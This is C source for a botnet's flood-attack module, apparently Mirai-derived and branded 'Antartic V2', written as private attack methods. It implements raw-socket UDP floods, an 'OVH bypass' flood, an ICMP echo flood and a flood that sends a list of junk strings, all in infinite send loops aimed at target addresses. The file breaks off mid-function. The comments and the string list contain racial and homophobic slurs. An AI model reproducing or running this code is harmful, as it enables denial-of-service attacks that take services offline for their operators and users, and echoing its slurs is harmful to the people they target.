/*
----------------------------------------------------------------------------------------------------------------------------
UDP Attack Table For Antartic V2, Custom Options For The UDP Flood, Randomized HEX Data (UID1 Supported). Custom ATK Values 
With Payload's, Encrypted Data. Customized Payload Options, Data Len, Minimized Len. Scripted For High PPS. (MinLen, MaxLen)
----------------------------------------------------------------------------------------------------------------------------
OVH Bypass, UDP Bypass, Buffer Overflow Flood Include Randomized Strings, High PPS, Customized Payload's. Customized Integers.
----------------------------------------------------------------------------------------------------------------------------
Included UDP Floods
UDP_Bypass (Advanced UDP Flood, Randomized Data Size, Buffer, Encrypted Values/Strings.)
Buffer_Overflow (Randomized Buffers To Requets, Randmization Options, High PPS.)
UDP_Flood/Plain (High PPS, High Len Data, Randomized SourcePorts.)
OVH_Bypass (Opts, OVH Payload, Randnum Values, Validated CSUM, Randomized SPORTS, False Data.)
ICMP_Echo (ICMP/IP, High PPS, High Len Data/Echo Requests)
VSE_Flood (High Len Value, Randomized SRC Ports 27015-27000. VSE_2 Payload's/ATK Table. Data Rand)
DNS_Flood (DNS Modified EX: dnsflood domain=nigger.com, Water Torture /)
------------------------------------------------------------------------------------------------------------------------------
Sexy Base Created By Yours Truly Carl Daddy/Divine. [PRIVATE ATK Methods]
------------------------------------------------------------------------------------------------------------------------------
*/

#define _GNU_SOURCE

#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_ether.h>
#include <netinet/ip_icmp.h>
//#include <openssl/tls1.h>
//#include <openssl/ssl.h> (SSL/TLS Handshake HTTPS.)
#include <stdint.h>
#include <poll.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>

#define MAX_FDS 1000
#define NONBLOCK
#define PHI 0x9e3779b9 //TEA Algorithim Constant.

//#define MAX_PACKET_SIZE 65535

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h"

static ipv4_t get_dns_resolver(void);
static unsigned long int Q[4096], c = 362436;

char *bufToSend[] = { //Revamped Buffer Overflow Attack For Telnet CNC, CPU.
    "hi",
    "hello",
    "owo",
    "uwu",
    "fuckingyourmemorycapacitysince1988;)",
    "bufferovaflowgobrrrr",
    "fuckyourcpuandmemoryhahahaha",
    "suckmadick",
    "considertogoofflinetyvm",
    "die",
    "\x90",
    "\xB5\x42\xA8\x68",
    "BotnetsAreGay",
    "ovhnigger",
    "\xff\xff\x55\x13", //Validated Checksum Payload.
    "imagegettingbufferoverflowed",
    "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01", //Query Payload
    "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
    "niggersource",
    "HE/HIMPussyTastesGreat",
    "carldaddywillfucku",
    "IWillNullYourToaster",
    "YourMicrowaveIsAPieceofShit",
    "suckinghorsecock",
    "KysFaggot",
    "niggerssmell",
    "niggersonyaforehead",
    "smellyballsacks",
};

void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}

unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; // include max_num in output
    } else {
        low_num = max_num + 1; // include max_num in output
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return (answer);
}

void attack_ovh_flood(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{    //Best Fucking Integers, Bypass OVH Servers For Days.
    int class[]= {2427209984,2475098112,3227739392,908573184,861083392,3227458816,908537344,861488128,3323681792,3323678720,2273116160,2273148928,868462592,868417536,1959395328,1959460864,2156658688,2276786176,2297626624,2328428544,2391048192,2420899840,2499477504,2639921152,2372231209,2728286747,908394496,1807564800,870224128,870229760,2371747840,2273116160,2273148928,2274623488,2274656256,2303328256,2338553856,633070592,2371813376,2371747840,2513087744,2371846144,2382675968,2385281024,2430140416,2448359424,870187008,860815360,908590080,908394496,2372231209,2728286747,1572769288,3339925505,2372233279,3254787125,1160024353,2328478311,3266388596,3238005002,1745910789,3455829265,1822614803,3355015169,3389792053,757144879,2734605396,1230980369,3639549962,2728310654,3256452616,3561573700,2918529833,2890221130,2918997764,2453837834,3369835018,3256452681,3007103780,1137178634,3264375402,3229415686,2728310653,3627732067,2890220626,1137178635,3391077889,1745910533,1755074592,16843009,1092011777,3223532318,2918529914,621985916,2728287341,1191626519,2890184316,1822618132,1168895755,3639551498,3455827995,3338431589,3222035998,1731284993,1540078376,3423468322,3254790913,2372224268,2372233305,1822611509,3639550986,2918529633,2890217035,2728286295,2728310634,1488976481,3372614717,3224391454,3223389196,2728329505,1760832002,879920151,3328983856,2728310645,2627363865,2372224322,1499753002,1386562582,875052612,3426605106,2890251825,2728286223,2728310638,2328478534,1822614881,879919113,846476877,3390912871,3238005001,2734604550,1746152824,1539838052,1475895815,1123085431,3639550485,3397779518,3254783489,3223277598,3236292914,2728329249,249627429,1745909765,3339148045,2890217051,1822614887,1746125597,1358538789,839341370,3732673086,3238005000,3221554718,3187841866,2918529910,2542501898,2372224274,1509469200,1121752324,3588504106,3281714501,2372231173,2354214403,1877438500,1746504997,1572678189,1386570514,1123631710,778390842,3562249811,3357634306,3355320065,3352559669,2918529846,2734605379,2728310629,2728292211,2627370561,1822618129,1121752339,879905324,864886835,401541676,3368085770,3281689978,3105469954,2734605380,2637637498,1746667045,1607997226,3226633758,2918529919,2918529639,2890216975,2734605608,2728310642,2627354890,2372224304,2372233499,1482909190,3475901778,3324575748,3221554177,3184129025,2890154342,2728303398,2673421074,2297665372,879919114,3627732078,3639551509,3423468304,3413598005,3355013121,3118228756,2890217308,2890217011,2728310650,2728292214,2627370049,2609248308,2061767504,401285152,3639550474,3544957520,3455828543,3221245464,3187838794,3118228793,2918529872,2609248268,225126924,1566231927,1559430661,1347043330,879905826,3367840010,3108454677,2745962606,2734604397,2734604388,2372226080,1541444905,763183627,3355643150,3234588170,2890217320,2372226403,2328477289,1746667301,1019160141,3455829021,3451508746,3352559679,3223953950,3036312413,2915649581,2728286231,2728295989,2609248267,1746883363,3495166517,3495166005,2728329546,2372226339,2354214404,225179146,1746651228,1755075616,1158721290,1123631699,757107306,3627734829,3588504105,3513807393,3372614671,3234222083,2918529587,2328472852,1822614857,1746651484,1729902934,16777217,1347570977,1249741850,401286176,3451508778,3339924993,3267263505,2890220602,2890217232,2734605610,2734604590,2627354634,2372233317,2061767503,3370514442,3224001822,3223391774,2890153573,2728286564,2609248309,2372231206,1746669130,1746505581,1746018670,1540324867,1490426385,3627734819,3571472426,3389791009,3339754505,3238004997,3224678942,3105432334,2918529646,2501132291,2372226408,2372233487,2372233333,1746505837,2916403734,2890153763,2609247813,2372231196,1822614893,1122525959,879894536,610792735,3588503850,3494790672,3350508607,3302533386,1572396061,1046910020,1039029042,778432376,679348486,3281684007,2728310635,2319739454,225126923,1822614869,1822614791,1390242054,1185293895,3629619233,3639549973,3356113973,3258558721,3224793118,3113151523,2918529907,2734605395,2728310655,1746669386,2734604591,2728310636,1760832065,1539137028,2728329756,2372231208,2372224328,879905323,675544612,634503170,3494653237,3162044975,3113716993,2919228438,2728310575,1054006394,3339146026,3339925761,3224087582,2328461595,225117528,1746152568,1092011009,879894535,97447234,3251539246,3223622673,3118228768,2728310632,2372233584,3627734830,3355643147,3339142145,3228574724,3221245453,2890152495,2734604396,2728310647,1822617914,1822612837,1494642712,3562246432,3238004993,3109164125,2745964819,2372231174,2264919306,1822617962,3647724345,3328294453,3224851230,3221245452,2728310599,2673449270,2609248307,2540009556,2372226378,1998378804,1745910021,879905827,676177781,3629620001,3254789121,3118786598,3113151522,2918529642,2728282915,1822617878,1746018414,1123077410,401541708,3339924737,2453837835,2151612981,1347928371,1249741851,2728286267,2734604551,2728286303,2372226052,3390923303,2734604389,1877351697,1475895816,2372231186,3663327556,3221245216,3639550997,3413595749,3252515125,2609247812,2372231207,2372226334,1746373394,3350509109,2372231195,3562380810,2918997773,3323221858,2918529663,2016704517,1475395139,1123631109,3238004999,1389915980,95573855,3238004998,3221245186,3118228769,3118228770,3225059358,3256452680,1779203355,1746883107,1760832066,1585621764,3222952990,3627734826,860815360,2427209984,861515776,787750912,1572769288,3339925505,2372233279,3254787125,1160024353,2328478311,3266388596,3238005002,1745910789,3455829265,1822614803,3355015169,3389792053,757144879,2734605396,1230980369,3639549962,2728310654,3256452616,3561573700,2918529833,2890221130,2918997764,2453837834,3369835018,3256452681,3007103780,1137178634,3264375402,3229415686,2728310653,3627732067,2890220626,1137178635,3391077889,1745910533,1755074592,16843009,1092011777,3223532318,2918529914,621985916,2728287341,1191626519,2890184316,1822618132,1168895755,3639551498,3455827995,3338431589,3222035998,1731284993,1540078376,3423468322,3254790913,2372224268,2372233305,1822611509,3639550986,2918529633,2890217035,2728286295,2728310634,1488976481,3372614717,3224391454,3223389196,2728329505,1760832002,879920151,3328983856,2728310645,2627363865,2372224322,1499753002,1386562582,875052612,3426605106,2890251825,2728286223,2728310638,2328478534,1822614881,879919113,846476877,3390912871,3238005001,2734604550,1746152824,1539838052,1475895815,1123085431,3639550485,3397779518,3254783489,3223277598,3236292914,2728329249,249627429,1745909765,3339148045,2890217051,1822614887,1746125597,1358538789,839341370,3732673086,3238005000,3221554718,3187841866,2918529910,2542501898,2372224274,1509469200,1121752324,3588504106,3281714501,2372231173,2354214403,1877438500,1746504997,1572678189,1386570514,1123631710,778390842,3562249811,3357634306,3355320065,3352559669,2918529846,2734605379,2728310629,2728292211,2627370561,1822618129,1121752339,879905324,864886835,401541676,3368085770,3281689978,3105469954,2734605380,2637637498,1746667045,1607997226,3226633758,2918529919,2918529639,2890216975,2734605608,2728310642,2627354890,2372224304,2372233499,1482909190,3475901778,3324575748,3221554177,3184129025,2890154342,2728303398,2673421074,2297665372,879919114,3627732078,3639551509,3423468304,3413598005,3355013121,3118228756,2890217308,2890217011,2728310650,2728292214,2627370049,2609248308,2061767504,401285152,3639550474,3544957520,3455828543,3221245464,3187838794,3118228793,2918529872,2609248268,225126924,1566231927,1559430661,1347043330,879905826,3367840010,3108454677,2745962606,2734604397,2734604388,2372226080,1541444905,763183627,3355643150,3234588170,2890217320,2372226403,2328477289,1746667301,1019160141,3455829021,3451508746,3352559679,3223953950,3036312413,2915649581,2728286231,2728295989,2609248267,1746883363,3495166517,3495166005,2728329546,2372226339,2354214404,225179146,1746651228,1755075616,1158721290,1123631699,757107306,3627734829,3588504105,3513807393,3372614671,3234222083,2918529587,2328472852,1822614857,1746651484,1729902934,16777217,1347570977,1249741850,401286176,3451508778,3339924993,3267263505,2890220602,2890217232,2734605610,2734604590,2627354634,2372233317,2061767503,3370514442,3224001822,3223391774,2890153573,2728286564,2609248309,2372231206,1746669130,1746505581,1746018670,1540324867,1490426385,3627734819,3571472426,3389791009,3339754505,3238004997,3224678942,3105432334,2918529646,2501132291,2372226408,2372233487,2372233333,1746505837,2916403734,2890153763,2609247813,2372231196,1822614893,1122525959,879894536,610792735,3588503850,3494790672,3350508607,3302533386,1572396061,1046910020,1039029042,778432376,679348486,3281684007,2728310635,2319739454,225126923,1822614869,1822614791,1390242054,1185293895,3629619233,3639549973,3356113973,3258558721,3224793118,3113151523,2918529907,2734605395,2728310655,1746669386,2734604591,2728310636,1760832065,1539137028,2728329756,2372231208,2372224328,879905323,675544612,634503170,3494653237,3162044975,3113716993,2919228438,2728310575,1054006394,3339146026,3339925761,3224087582,2328461595,225117528,1746152568,1092011009,879894535,97447234,3251539246,3223622673,3118228768,2728310632,2372233584,3627734830,3355643147,3339142145,3228574724,3221245453,2890152495,2734604396,2728310647,1822617914,1822612837,1494642712,3562246432,3238004993,3109164125,2745964819,2372231174,2264919306,1822617962,3647724345,3328294453,3224851230,3221245452,2728310599,2673449270,2609248307,2540009556,2372226378,1998378804,1745910021,879905827,676177781,3629620001,3254789121,3118786598,3113151522,2918529642,2728282915,1822617878,1746018414,1123077410,401541708,3339924737,2453837835,2151612981,1347928371,1249741851,2728286267,2734604551,2728286303,2372226052,3390923303,2734604389,1877351697,1475895816,2372231186,3663327556,3221245216,3639550997,3413595749,3252515125,2609247812,2372231207,2372226334,1746373394,3350509109,2372231195,3562380810,2918997773,3323221858,2918529663,2016704517,1475395139,1123631109,3238004999,1389915980,95573855,3238004998,3221245186,3118228769,3118228770,3225059358,3256452680,1779203355,1746883107,1760832066,1585621764,3222952990,3627734826};
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint16_t packet_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1440);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    char *ovh_payload;
    int ovh_payload_len;
    table_unlock_val(TABLE_ATK_OVH);
    ovh_payload = table_retrieve_val(TABLE_ATK_OVH, &ovh_payload_len);
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = 0;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + ovh_payload_len);
        iph->id = htons(ip_ident);
        iph->ttl = 128;
        if (dont_frag)
        iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->daddr = targs[i].addr;
        iph->saddr = LOCAL_ADDR;
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->check = 0;
        udph->len = htons(sizeof (struct udphdr) + ovh_payload_len);
        *((uint32_t *)data) = 0xffffffff;
        data += sizeof (uint32_t);
        util_memcpy(data, ovh_payload, ovh_payload_len);
       // rand_str(ovh_payload, packet_lenght);

    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {

            int fake_id = 0;
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            int packet_lenght = 0;
            unsigned char payload1[packet_size];
            packet_lenght = randnum(500, packet_size);

            for(int i = 0; i <= packet_lenght; i++){
                payload1[i] = rand_cmwc();
            }   
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (ip_ident == 0xffff)
                iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
            if (dport == 0xffff)
                udph->dest = htons(randnum(55000,64932));
            if (sport == 0xffff)
                udph->source = htons(randnum(55000,64932));
            //Randomize Payload Data. rand=1
            if (data_rand)
                rand_alpha_str(ovh_payload, packet_lenght);

            udph->len=htons(sizeof(struct udphdr) + packet_lenght);

            iph->check = 0;
            iph->check = csum ((unsigned short *) pkt, iph->tot_len);
            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + ovh_payload_len + packet_lenght, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
} 
void attack_icmpecho(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    #ifdef DEBUG
    printf("ICMP ECHO\n");
    #endif

    unsigned long daddr;
    unsigned long saddr;
    int payload_size = 0, i, sent, sent_size;

    for (i = 0; i < targs_len; i++)
    {
        daddr = targs[i].addr;
    }
    saddr = util_local_addr();
    int increase_size = rand_next() % 299;
    int start_size = 1400;
    int r;
    payload_size = start_size + increase_size;
    
    int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
    
    if (sockfd < 0) 
    {
        exit (1);
    }
    
    int on = 1;
    
    // We shall provide IP headers
    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1) 
    {
        //perror("setsockopt");
        exit (1);
    }
    
    //allow socket to send datagrams to broadcast addresses
    if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1) 
    {
        exit(1);
    }   
    
    //Calculate total packet size
    int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
    char *packet = (char *) malloc (packet_size);
                   
    if (!packet) 
    {
        close(sockfd);
        exit (1);
    }
    
    //ip header
    struct iphdr *ip = (struct iphdr *) packet;
    struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
    
    //zero out the packet buffer
    memset (packet, 0, packet_size);

    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons (packet_size);
    ip->id = rand ();
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = saddr;
    ip->daddr = daddr;
    ip->check = in_cksum ((uint16_t *) ip, sizeof (struct iphdr));

    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.sequence = rand();
    icmp->un.echo.id = rand();
    //checksum
    icmp->checksum = 0;
    
    struct sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = daddr;
    memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));
    
    while (1)
    {
        memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
        
        //recalculate the icmp header checksum since we are filling the payload with random characters everytime
        icmp->checksum = 0;
        icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
        
        if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
        {
            break;
        }
        
        usleep(5000);
    }
    free(packet);
    close(sockfd);
    
}
void attack_method_udp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("in udp plain\n");
#endif

    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};

    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

#ifdef DEBUG
    printf("after args\n");
#endif

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(65535, sizeof (char));

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
        }

        // For prefix attacks
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to connect udp socket.\n");
#endif
        }
    }

#ifdef DEBUG
    printf("after setup\n");
#endif

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            // Randomize packet content?
            if (data_rand)
                rand_str(data, data_len);

#ifdef DEBUG
            errno = 0;
            if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
            {
                printf("send failed: %d\n", errno);
            } else {
                printf(".\n");
            }
#else
            send(fds[i], data, data_len, MSG_NOSIGNAL);
#endif
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

void attack_method_buffer(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, b;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1460);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];
            if (data_rand)
                rand_str(data, data_len);

            for(b = 0; i < sizeof(bufToSend) / sizeof(bufToSend[0]); i++) {
                send(fds[i], bufToSend[i], 1458, MSG_NOSIGNAL);  
            }
        }
    }
}

void attack_udp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts){
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 2048);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    char *udpkick_payload;
    int udpkick_payload_len;
    table_unlock_val(TABLE_ATK_UDPKICK);
    udpkick_payload = table_retrieve_val(TABLE_ATK_UDPKICK, &udpkick_payload_len);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + udpkick_payload_len + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
        iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = targs[i].addr;
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + 4 + udpkick_payload_len + data_len);
        *((uint32_t *)data) = 0xffffffff;
        data += sizeof (uint32_t);
        util_memcpy(data, udpkick_payload, udpkick_payload_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            udph->check = 0;
